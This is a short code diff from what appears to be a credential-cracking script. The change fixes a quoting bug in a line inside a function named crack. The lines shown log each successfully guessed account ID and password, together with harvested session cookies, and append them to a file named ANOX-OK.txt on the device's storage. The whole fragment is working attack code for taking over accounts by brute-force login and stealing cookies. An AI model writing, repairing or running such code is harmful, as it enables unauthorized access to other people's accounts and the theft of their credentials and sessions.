@@ -629,7 +629,7 @@ def crack(idf,pwv):
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[0;92m[ANOX-Ok🌍] {idf} | {pw}\n\033[0;93m[🍎]= COOKIES • \033[0;92m{kuki} ')
-                open('/sdcard/ANOX-OK.txt,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+                open('/sdcard/ANOX-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                 break
                 
             else:
